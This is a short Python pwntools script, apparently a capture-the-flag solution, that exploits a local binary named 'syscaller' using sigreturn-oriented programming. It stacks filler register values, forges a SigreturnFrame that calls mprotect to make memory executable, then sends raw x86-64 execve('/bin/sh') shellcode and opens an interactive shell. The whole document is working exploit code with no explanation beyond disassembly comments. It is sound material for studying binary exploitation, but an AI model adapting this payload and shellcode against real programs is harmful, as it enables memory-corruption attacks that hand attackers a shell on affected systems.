from pwn import *

context.arch = "amd64"
context.binary = ELF("./syscaller")
elf = ELF("./syscaller")
target = process("./syscaller")

# .text:0000000000400118                     syscall                 ; LINUX - sys_read
# .text:000000000040011A                     pop     r12
# .text:000000000040011C                     pop     r11
# .text:000000000040011E                     pop     rdi
# .text:000000000040011F                     pop     rax
# .text:0000000000400120                     pop     rbx
# .text:0000000000400121                     pop     rdx
# .text:0000000000400122                     pop     rsi
# .text:0000000000400123                     pop     rdi
# .text:0000000000400124                     syscall                 ; LINUX -
# .text:0000000000400126                     mov     eax, 3Ch ; '<'
# .text:000000000040012B                     xor     rdi, rdi
# .text:000000000040012E                     syscall                 ; LINUX - sys_exit

r12 = b"0" * 8
r11 = b"1" * 8
rdi_trash = b"0" * 8
rax = p64(0xf)
rbx = b"0" * 8
rdx = b"1" * 8
rsi = b"0" * 8
rdi_trash2 = b"1" * 8

payload = flat(
    r12,
    r11,
    rdi_trash,
    rax,
    rbx,
    rdx,
    rsi,
    rdi_trash2
)

frame = SigreturnFrame()
frame.rip = 0x400104
frame.rax = 0xa
frame.rdi = 0x4000e0
frame.rsi = 0x1000
frame.rdx = 0x7
frame.rsp = 0x40012e

payload += bytes(frame)
target.sendline(payload)
raw_input("Press Enter to send shellcode...")

shellcode = b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"

target.sendline(shellcode)
log.success("SROP successful, shell popped!")
target.interactive()
